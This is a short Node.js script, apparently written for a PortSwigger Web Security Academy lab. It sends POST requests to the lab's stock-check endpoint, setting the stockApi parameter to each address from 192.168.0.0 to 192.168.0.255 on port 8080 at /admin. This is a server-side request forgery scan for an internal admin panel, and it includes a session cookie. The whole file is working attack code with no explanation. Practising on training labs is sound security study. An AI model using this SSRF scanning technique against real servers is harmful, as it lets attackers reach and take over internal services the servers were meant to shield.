import fetch from 'node-fetch'
for (let i=0;i<256;i++){
  fetch("https://0a1c006403c7ef69807e3f6a00150049.web-security-academy.net/product/stock", {
    "headers": {
      "accept": "*/*",
      "accept-language": "en-US,en;q=0.9",
      "cache-control": "no-cache",
      "content-type": "application/x-www-form-urlencoded",
      "pragma": "no-cache",
      "sec-ch-ua": "\"Brave\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"",
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": "\"Windows\"",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin",
      "sec-gpc": "1",
      "cookie": "session=9YeukgkOZ44nSxV7iH3s3dtd6OjXeXfM",
      "Referer": "https://0a1c006403c7ef69807e3f6a00150049.web-security-academy.net/product?productId=1",
      "Referrer-Policy": "strict-origin-when-cross-origin"
    },
    "body": `stockApi=http%3A%2F%2F192.168.0.${i}%3A8080%2Fadmin`,
    "method": "POST"
  }).then(res=>{
      return res.text();
    }).then(txt=>{
    console.log(txt)
    }).catch(()=>console.log("error Happended"))
}
